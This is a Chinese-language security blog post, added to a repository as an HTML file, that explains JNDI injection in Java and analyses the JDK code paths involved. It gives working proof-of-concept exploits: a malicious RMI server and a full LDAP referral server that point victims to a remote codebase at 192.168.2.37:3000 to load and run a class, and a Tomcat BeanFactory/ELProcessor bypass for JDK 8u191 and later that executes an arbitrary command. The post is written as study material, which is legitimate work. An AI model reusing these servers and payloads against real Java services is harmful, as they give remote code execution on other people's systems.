@@ -1,0 +1,807 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>JNDI | Hurn's Blog</title><meta name="description" content="JNDI - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">JNDI</h1><div class="post-info"><a></a>2022-05-23</div><div class="post-content"><h1 id="0x1-JNDI"><a href="#0x1-JNDI" class="headerlink" title="0x1 JNDI"></a>0x1 JNDI</h1><p>一些概念：</p>
+<p>Refrence ，引用，在JNDI绑定对象时可以直接序列化对象进行绑定，但是有的类太大了，所以可以绑定这个类的引用在JNDI中，这个引用包含去哪找这个类、如何构建这个类的信息。</p>
+<p>codebase 就是在 ctx.lookup中写的地址<code>rmi://1.1.1.1/Object </code>，攻击的时候这个Object返回的是一个引用，让去 <a target="_blank" rel="noopener" href="http://2.2.2.2/EvilObject">http://2.2.2.2/EvilObject</a> ，7u21之后默认为True ，所以将不会往去<a target="_blank" rel="noopener" href="http://2.2.2.2这个服务查找类./">http://2.2.2.2这个服务查找类。</a></p>
+<h1 id="0x2-JNDI-利用方式"><a href="#0x2-JNDI-利用方式" class="headerlink" title="0x2 JNDI 利用方式"></a>0x2 JNDI 利用方式</h1><h2 id="0x2-1-RMI-Remote-Object-Payload"><a href="#0x2-1-RMI-Remote-Object-Payload" class="headerlink" title="0x2.1 RMI Remote Object Payload"></a>0x2.1 RMI Remote Object Payload</h2><p>RMI Server 绑定一个恶意对象，将这个对象放在HTTP/FTP/SMB等服务器上，供受害者的RMI客户端远程加载执行。lookup会先从本地CLASSPATH中获取对应的Stub类的定义，从本地加载，如果没有找到则向远程Codebase去获取攻击者对象指定的恶意对象，这种方式会限制useCodebaseOnly的限制，利用条件：</p>
+<ul>
+<li>RMI客户端的上下文环境允许访问远程Codebase。</li>
+<li>属性 java.rmi.server.useCodebaseOnly 的值必需为false。</li>
+</ul>
+<p>从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
+<h2 id="0x2-2-JNDI-RMI-Reference-Payload"><a href="#0x2-2-JNDI-RMI-Reference-Payload" class="headerlink" title="0x2.2 JNDI + RMI Reference Payload"></a>0x2.2 JNDI + RMI Reference Payload</h2><p>攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类，但是原理上并非使用RMI Class Loading机制的，因此不受 <code>java.rmi.server.useCodebaseOnly</code>系统属性的限制，相对来说更加通用。</p>
+<p>但是在JDK 6u132,JDK 7u122,JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启RMI Registry或者COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。</p>
+<p>环境：jdk7u21</p>
+<p>POC:</p>
+<pre><code class="java">// JDNIServer
+package jndi;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import javax.naming.Reference;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+
+public class RMIServer &#123;
+    public static void main(String[] args) throws Exception&#123;
+        Registry registry = LocateRegistry.createRegistry(1099);
+        Reference aa = new Reference(&quot;ExecTest&quot;, &quot;ExecTest&quot;, &quot;http://192.168.2.37:3000/&quot;);
+        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
+        System.out.println(&quot;Binding &#39;refObjWrapper&#39; to &#39;rmi://127.0.0.1:1099/ExecTest&#39;&quot;);
+        registry.bind(&quot;ExecTest&quot;, refObjWrapper);
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">// ExecTest
+public class ExecTest &#123;
+    public ExecTest() throws Exception &#123;
+        String var1 = &quot;calc&quot;;
+        Process var2 = Runtime.getRuntime().exec(var1);
+        int var3 = var2.waitFor();
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">// JNDIClient
+package jndi;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+public class JNDIClient &#123;
+    public static void main(String[] args) throws Exception&#123;
+        //System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);
+
+        String uri = &quot;rmi://127.0.0.1:1099/ExecTest&quot;;
+        Context ctx = new InitialContext();
+        ctx.lookup(uri);
+
+    &#125;
+&#125;
+</code></pre>
+<blockquote>
+<p>注意： ExecTest 类，不要有包名，JDK的版本尽量与JDNClient编译的相同</p>
+</blockquote>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220523202651817.png" alt="image-20220523202651817"></p>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220523202344610.png" alt="image-20220523202344610"></p>
+<p>调用堆栈：</p>
+<pre><code class="调用堆栈">getObjectInstance:315, NamingManager (javax.naming.spi)
+decodeObject:456, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:120, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
+lookup:411, InitialContext (javax.naming)
+main:11, JNDIClient (jndi)
+</code></pre>
+<p>分析为啥能弹计算器，跟进客户端的<code>ctx.lookup(&quot;rmi://127.0.0.1:1099/ExecTest&quot;)</code> 函数：</p>
+<ol>
+<li>根据传入的URL解析获得Context，比如传入的协议是rmi 就会产生rmiURLContenxt， 传入ldap就会产生ldapURLContext，然后执行这个Context的lookup方法，此时获取的 rmiURLContext</li>
+</ol>
+<pre><code class="java">// javax.naming.InitialContext#lookup    
+        public Object lookup(String name) throws NamingException &#123;
+       // 获取一个Context，调用这个Context的lookup
+       return getURLOrDefaultInitCtx(name).lookup(name);
+     &#125;
+
+    protected Context getURLOrDefaultInitCtx(String name)
+        throws NamingException &#123;
+        if (NamingManager.hasInitialContextFactoryBuilder()) &#123;
+            return getDefaultInitCtx();
+        &#125;
+          // 获取scheme 也就是 rmi ， 如果没有则返回默认的Context
+        String scheme = getURLScheme(name);
+        if (scheme != null) &#123;
+              // 根据不同的scheme生成Context，这里实际取到的是rmiURLContext
+            Context ctx = NamingManager.getURLContext(scheme, myProps);
+            if (ctx != null) &#123;
+                return ctx;
+            &#125;
+        &#125;
+        return getDefaultInitCtx();
+    &#125;
+</code></pre>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220524094533724.png" alt="image-20220524094533724"></p>
+<ol start="2">
+<li>获取要用来解析URL的类，在这里是从rmi schema过来的<code>RegistryContext</code></li>
+</ol>
+<p>看GenericURLContext这个类的描述，这是一个抽象类，用来实现多态的，通过<code>this.getRootURLContext</code>和<code>getResolvedObj</code>方法获取真正去解析的子类，从第一步传过来的<code>rmiURLContext</code> 取到 <code>RegistryContext</code>, <code>RegistryContext.lookup</code>才是真正去解析URL(rmi://127.0.0.1:1099/ExecTest)</p>
+<blockquote>
+<p>This abstract class is a generic URL context that accepts as the name argument either a string URL or a Name whose first component is a URL. It resolves the URL to a target context and then continues the operation using the remaining name in the target context as if the first component names a junction. A subclass must define getRootURLContext() to process the URL into head/tail pieces. If it wants to control how URL strings are parsed and compared for the rename() operation, then it should override getNonRootURLSuffixes() and urlEquals().<br>Author:<br>Scott Seligman, Rosanna Lee</p>
+</blockquote>
+<pre><code class="java">//com.sun.jndi.toolkit.url.GenericURLContext#getContinuationContext    
+    public Object lookup(String var1) throws NamingException &#123;
+            // 获取rmiRegistry 和 要解析的对象名字（aa）
+        ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);
+            // RegistryContext
+        Context var3 = (Context)var2.getResolvedObj();
+
+        Object var4;
+        try &#123;
+            var4 = var3.lookup(var2.getRemainingName());
+        &#125; finally &#123;
+            var3.close();
+        &#125;
+
+        return var4;
+    &#125;
+</code></pre>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220524092207419.png" alt="image-20220524092207419"></p>
+<ol start="3">
+<li>RegistryContext 实际相当于RMI Registry ，从Registry中取回绑定对象的信息，是序列化的类还是引用或者其他。</li>
+</ol>
+<blockquote>
+<p>A RegistryContext is a context representing a remote RMI registry.<br>Author:<br>Scott Seligman</p>
+</blockquote>
+<pre><code class="java">// com.sun.jndi.rmi.registry.RegistryContext    
+    public Object lookup(Name var1) throws NamingException &#123;
+        if (var1.isEmpty()) &#123;
+            return new RegistryContext(this);
+        &#125; else &#123;
+            Remote var2;
+            try &#123;
+                var2 = this.registry.lookup(var1.get(0));
+            &#125; catch (NotBoundException var4) &#123;
+                throw new NameNotFoundException(var1.get(0));
+            &#125; catch (RemoteException var5) &#123;
+                throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
+            &#125;
+
+            return this.decodeObject(var2, var1.getPrefix(1));
+        &#125;
+    &#125;
+</code></pre>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220524095530150.png" alt="image-20220524095530150"></p>
+<ol start="4">
+<li>这步和下一步就是能JNDI注入的原因，如果是一个远程引用则会去远程服务器上加载，如果这是一个恶意类，那就可以为所欲为了。</li>
+</ol>
+<pre><code class="java">  //com.sun.jndi.rmi.registry.RegistryContext#decodeObject  
+    private Object decodeObject(Remote var1, Name var2) throws NamingException &#123;
+        try &#123;
+              // 高版本的JDK在这里加入了trustURLCodebase的限制
+              // 判断是否为远程引用，如果是则获取引用
+            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
+              // 真正创建对象的函数
+            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
+</code></pre>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220524100117108.png" alt="image-20220524100117108"></p>
+<ol start="5">
+<li>在<code>getObjectInstance</code> 这个函数里面，会先判断是否传入factoryClassName 也就是工厂类，如果有则先创建这个工厂，然后通过这个工厂的<code>factory.getObjectInstance</code>的方法来创建实例，如果这个工厂类不在本地的CLASSPATH中则会去远程服务器上查找<code>http://192.168.2.37:3000/</code>并进行实例化，如果这个工厂类在本地存在，则使用本地工厂来创建实例。</li>
+</ol>
+<blockquote>
+<p>这就是高版本JDK bypass的方法之一，可以使用一个本地参数可控的工厂来构建任意对象，不再去远程加载了。</p>
+</blockquote>
+<pre><code class="java">// javax.naming.spi.NamingManager#getObjectInstance    
+    public static Object
+        getObjectInstance(Object refInfo, Name name, Context nameCtx,
+                          Hashtable&lt;?,?&gt; environment)
+        throws Exception
+    &#123;
+
+        ObjectFactory factory;
+                
+          // 省略无关代码...
+    
+        // Use reference if possible
+        Reference ref = null;
+        if (refInfo instanceof Reference) &#123;
+            ref = (Reference) refInfo;
+        &#125; else if (refInfo instanceof Referenceable) &#123;
+            ref = ((Referenceable)(refInfo)).getReference();
+        &#125;
+
+        Object answer;
+
+        if (ref != null) &#123;
+              // 获取工厂的名字
+            String f = ref.getFactoryClassName();
+            if (f != null) &#123;
+                // if reference identifies a factory, use exclusively
+                                // 通过reference去创建工厂
+                factory = getObjectFactoryFromReference(ref, f);
+                  
+                // 如果工厂创建成功
+                if (factory != null) &#123;
+                      // 则用来创建对象
+                    return factory.getObjectInstance(ref, name, nameCtx,
+                                                     environment);
+                &#125;
+                // No factory found, so return original refInfo.
+                // Will reach this point if factory class is not in
+                // class path and reference does not contain a URL for it
+                return refInfo;
+
+            &#125; else &#123;
+                // if reference has no factory, check for addresses
+                // containing URLs
+
+                answer = processURLAddrs(ref, name, nameCtx, environment);
+                if (answer != null) &#123;
+                    return answer;
+                &#125;
+            &#125;
+        &#125;
+
+        // try using any specified factories
+        answer =
+            createObjectFromFactories(refInfo, name, nameCtx, environment);
+        return (answer != null) ? answer : refInfo;
+    &#125;
+</code></pre>
+<ol start="6">
+<li>构建工厂类，<code>getObjectFactoryFromReference</code></li>
+</ol>
+<pre><code class="java">// javax.naming.spi.NamingManager#getObjectFactoryFromReference
+  
+  
+    static ObjectFactory getObjectFactoryFromReference(
+        Reference ref, String factoryName)
+        throws IllegalAccessException,
+        InstantiationException,
+        MalformedURLException &#123;
+        Class clas = null;
+                
+        // 先从本地CLASSPATH中查找是否存在这个类
+        // Try to use current class loader
+        try &#123;
+             clas = helper.loadClass(factoryName);
+        &#125; catch (ClassNotFoundException e) &#123;
+            // ignore and continue
+            // e.printStackTrace();
+        &#125;
+        // All other exceptions are passed up.
+                
+        // 如果没有则去远程codebase加载，高版本的bypass让下面这个表达式不成立，继续执行clas.newInstance
+        // Not in class path; try to use codebase
+        String codebase;
+        if (clas == null &amp;&amp;
+                (codebase = ref.getFactoryClassLocation()) != null) &#123;
+            try &#123;
+                  // helper.loaddClass 里面调用的URLClassLoader，从远程获取class
+                clas = helper.loadClass(factoryName, codebase);
+            &#125; catch (ClassNotFoundException e) &#123;
+            &#125;
+        &#125;
+                // 创建实例
+        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
+    &#125;
+</code></pre>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220524101829365.png" alt="image-20220524101829365"></p>
+<p>跟进<code>helper.loadClass</code>，可以看到是调用URLClassLoader去加载</p>
+<pre><code class="java">    /**
+     * @param className A non-null fully qualified class name.
+     * @param codebase A non-null, space-separated list of URL strings.
+     */
+    public Class loadClass(String className, String codebase)
+        throws ClassNotFoundException, MalformedURLException &#123;
+        ClassLoader cl;
+
+        ClassLoader parent = getContextClassLoader();
+        cl = URLClassLoader.newInstance(getUrlArray(codebase), parent);
+
+        return Class.forName(className, true, cl);
+    &#125;
+</code></pre>
+<p>这里可以看到jdk8u322高版本的JDK限制，运行会提示错误：</p>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220526100305969.png" alt="image-20220526100305969"></p>
+<p>跟踪代码：</p>
+<pre><code class="java">// com.sun.jndi.rmi.registry.RegistryContext#decodeObject
+            if (ref != null &amp;&amp; ref.getFactoryClassLocation() != null &amp;&amp;
+                !trustURLCodebase) &#123;
+                throw new ConfigurationException(
+                    &quot;The object factory is untrusted. Set the system property&quot; +
+                    &quot; &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.&quot;);
+            &#125;
+            return NamingManager.getObjectInstance(obj, name, this,
+                                                   environment);
+</code></pre>
+<p><code>trustURLCodebase</code> 默认为false ，所以会直接抛出异常</p>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220526100506359.png" alt="image-20220526100506359"></p>
+<p>ref的属性，后面bypass 就是将<code>ref.getFactoryClassLocation() == null</code>，不再去远程加载类了，直接使用本地的工厂构建任意对象。</p>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220526100232986.png" alt="image-20220526100232986"></p>
+<p>另外实际不止有lookup方法可以注入，类似的还有<code>InitialContext.rename()</code>、<code>InitialContext.lookupLink()</code>方法也最终会调用lookup。</p>
+<h2 id="0x2-3-JNDI-LDAP-Reference-Payload"><a href="#0x2-3-JNDI-LDAP-Reference-Payload" class="headerlink" title="0x2.3 JNDI + LDAP Reference Payload"></a>0x2.3 JNDI + LDAP Reference Payload</h2><p>除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，所以适用范围更广。</p>
+<p>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u191、7u201、6u211之后 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 属性的默认值被调整为false</p>
+<p>POM:</p>
+<pre><code class="xml">        &lt;dependency&gt;
+            &lt;groupId&gt;com.unboundid&lt;/groupId&gt;
+            &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;
+            &lt;version&gt;4.0.9&lt;/version&gt;
+        &lt;/dependency&gt;
+</code></pre>
+<p>POC:</p>
+<pre><code class="java">// LDAPServer
+package jndi;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+
+public class LDAPServer &#123;
+
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+
+    public static void main(String[] argsx) &#123;
+        String[] args = new String[]&#123;&quot;http://192.168.2.37:3000/#ExecTest&quot;, &quot;9999&quot;&#125;;
+        int port = 0;
+        if (args.length &lt; 1 || args[0].indexOf(&#39;#&#39;) &lt; 0) &#123;
+            System.err.println(LDAPServer.class.getSimpleName() + &quot; &lt;codebase_url#classname&gt; [&lt;port&gt;]&quot;); //$NON-NLS-1$
+            System.exit(-1);
+        &#125; else if (args.length &gt; 1) &#123;
+            port = Integer.parseInt(args[1]);
+        &#125;
+
+        try &#123;
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;, //$NON-NLS-1$
+                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$
+            ds.startListening();
+
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;
+
+        private URL codebase;
+
+        public OperationInterceptor(URL cb) &#123;
+            this.codebase = cb;
+        &#125;
+
+        @Override
+        public void processSearchResult(InMemoryInterceptedSearchResult result) &#123;
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try &#123;
+                sendResult(result, base, e);
+            &#125; catch (Exception e1) &#123;
+                e1.printStackTrace();
+            &#125;
+
+        &#125;
+
+        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException &#123;
+            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#39;.&#39;, &#39;/&#39;).concat(&quot;.class&quot;));
+            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);
+            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
+            String cbstring = this.codebase.toString();
+            int refPos = cbstring.indexOf(&#39;#&#39;);
+            if (refPos &gt; 0) &#123;
+                cbstring = cbstring.substring(0, refPos);
+            &#125;
+            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);
+            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$
+            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        &#125;
+
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">// JNDIClient
+package jndi;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+public class JNDIClient &#123;
+    public static void main(String[] args) throws Exception&#123;
+        String uri = &quot;ldap://127.0.0.1:9999/ExecTest&quot;;
+        Context ctx = new InitialContext();
+        ctx.lookup(uri);
+
+    &#125;
+&#125;
+</code></pre>
+<p>客户端分析：</p>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220525103329995.png" alt="image-20220525103329995"></p>
+<ol>
+<li>LdapCtx这个地方才是真正的LDAP解析</li>
+</ol>
+<pre><code class="java"> // com.sun.jndi.ldap.LdapCtx#c_lookup
+    protected Object c_lookup(Name name, Continuation cont)
+            throws NamingException &#123;
+        cont.setError(this, name);
+        Object obj = null;
+        Attributes attrs;
+
+        try &#123;
+            SearchControls cons = new SearchControls();
+            cons.setSearchScope(SearchControls.OBJECT_SCOPE);
+            cons.setReturningAttributes(null); // ask for all attributes
+            cons.setReturningObjFlag(true); // need values to construct obj
+                        
+              // 去LDAP获得类属性
+            LdapResult answer = doSearchOnce(name, &quot;(objectClass=*)&quot;, cons, true);
+            respCtls = answer.resControls; // retrieve response controls
+
+            // should get back 1 SearchResponse and 1 SearchResult
+                        // 判断是否搜索成功
+            if (answer.status != LdapClient.LDAP_SUCCESS) &#123;
+                processReturnCode(answer, name);
+            &#125;
+
+            if (answer.entries == null || answer.entries.size() != 1) &#123;
+                // found it but got no attributes
+                attrs = new BasicAttributes(LdapClient.caseIgnore);
+            &#125; else &#123;
+                LdapEntry entry = answer.entries.elementAt(0);
+                attrs = entry.attributes;
+
+                Vector&lt;Control&gt; entryCtls = entry.respCtls; // retrieve entry controls
+                if (entryCtls != null) &#123;
+                    appendVector(respCtls, entryCtls); // concatenate controls
+                &#125;
+            &#125;
+                        
+              // Obj.CLASSNAME = 2 , Obj.JAVA_ATTRIBUTES[2] = javaClassName
+              // 在判断从LDAP有没有取回来javaClassName 这个属性
+            if (attrs.get(Obj.JAVA_ATTRIBUTES[Obj.CLASSNAME]) != null) &#123;
+                  // 序列化对象或者引用
+                // serialized object or object reference
+                obj = Obj.decodeObject(attrs);
+            &#125;
+            if (obj == null) &#123;
+                obj = new LdapCtx(this, fullyQualifiedName(name));
+            &#125;
+</code></pre>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220525102832684.png" alt="image-20220525102832684"></p>
+<ol start="2">
+<li>在decodeObject时与RMI Refrence有所不同，后面都大同小异了，如果是远程reference就去加载解析。</li>
+</ol>
+<pre><code class="java">// com.sun.jndi.ldap.Obj  
+    static Object decodeObject(Attributes var0) throws NamingException &#123;
+        String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));
+
+        try &#123;
+            Attribute var1;
+              // 直接反序列化类
+            if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) &#123;
+                ClassLoader var3 = helper.getURLClassLoader(var2);
+                return deserializeObject((byte[])((byte[])var1.get()), var3);
+            // 这是去加载RMI吗
+            &#125; else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) &#123;
+                return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
+            // 远程引用类，这里会调用decodeReference
+            &#125; else &#123;
+                var1 = var0.get(JAVA_ATTRIBUTES[0]);
+                return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
+            &#125;
+        &#125; catch (IOException var5) &#123;
+            NamingException var4 = new NamingException();
+            var4.setRootCause(var5);
+            throw var4;
+        &#125;
+    &#125;
+</code></pre>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220524230943855.png" alt="image-20220524230943855"></p>
+<h1 id="0x3-绕过JDK-8u191-等高版本限制"><a href="#0x3-绕过JDK-8u191-等高版本限制" class="headerlink" title="0x3. 绕过JDK 8u191+等高版本限制"></a>0x3. 绕过JDK 8u191+等高版本限制</h1><p>所以对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下：</p>
+<ol>
+<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li>
+<li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li>
+<li>JRMP：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&mid=2247483796&idx=1&sn=ce4249ba61d7f402a1211e508f83d2b4&chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&mpshare=1&scene=23&srcid=&sharer_sharetime=1577970121763&sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd">空指针-treasure-Writeup</a></li>
+</ol>
+<p> 这三种方式都依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。</p>
+<h2 id="0x3-1-Local-Refrence-Factory"><a href="#0x3-1-Local-Refrence-Factory" class="headerlink" title="0x3.1 Local Refrence Factory"></a>0x3.1 Local Refrence Factory</h2><p>使用本地工厂类去创建任意对象。</p>
+<h3 id="0x3-1-1-Tomcat-BeanFactory"><a href="#0x3-1-1-Tomcat-BeanFactory" class="headerlink" title="0x3.1.1 Tomcat  BeanFactory"></a>0x3.1.1 Tomcat  BeanFactory</h3><p>POC:</p>
+<p>POM依赖</p>
+<pre><code class="xml">&lt;dependency&gt;
+  &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+  &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+  &lt;version&gt;9.0.20&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;dependency&gt;
+  &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+  &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;
+  &lt;version&gt;9.0.8&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;dependency&gt;
+  &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+  &lt;artifactId&gt;tomcat-jasper&lt;/artifactId&gt;
+  &lt;version&gt;9.0.20&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<pre><code class="java">// RMIServer
+package jndi;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import org.apache.naming.ResourceRef;
+
+import javax.naming.Reference;
+import javax.naming.StringRefAddr;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+
+public class RMIServer2 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        Registry registry = LocateRegistry.createRegistry(1099);
+        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);
+        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=eval&quot;));
+        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;)&quot;));
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
+        registry.bind(&quot;ExecTest&quot;, referenceWrapper);
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">// JDNIClient
+package jndi;
+
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.directory.InitialDirContext;
+import java.util.Hashtable;
+
+public class JNDIClient &#123;
+    public static void main(String[] args) throws Exception&#123;
+        String uri = &quot;rmi://127.0.0.1:1099/ExecTest&quot;;
+        Context ctx = new InitialContext();
+        ctx.lookup(uri);
+
+    &#125;
+&#125;
+</code></pre>
+<p>JDK8u332</p>
+<p><img src="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/image-20220526130933959.png" alt="image-20220526130933959"></p>
+<p>在分析计算器如何弹出来之前研究下这是什么，这个ResourceRef 是什么：</p>
+<pre><code class="java">ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);
+resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=eval&quot;));
+resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;)&quot;));
+</code></pre>
+<p>一些相关的类：</p>
+<ul>
+<li>Refrence ， 在Naming/Directory中的引用，由 一堆地址 和 被引用对象的类信息组成，地址用来标识如何去找这个类，类的信息包括类名、创建这个类的工厂类名、工厂类的引用</li>
+</ul>
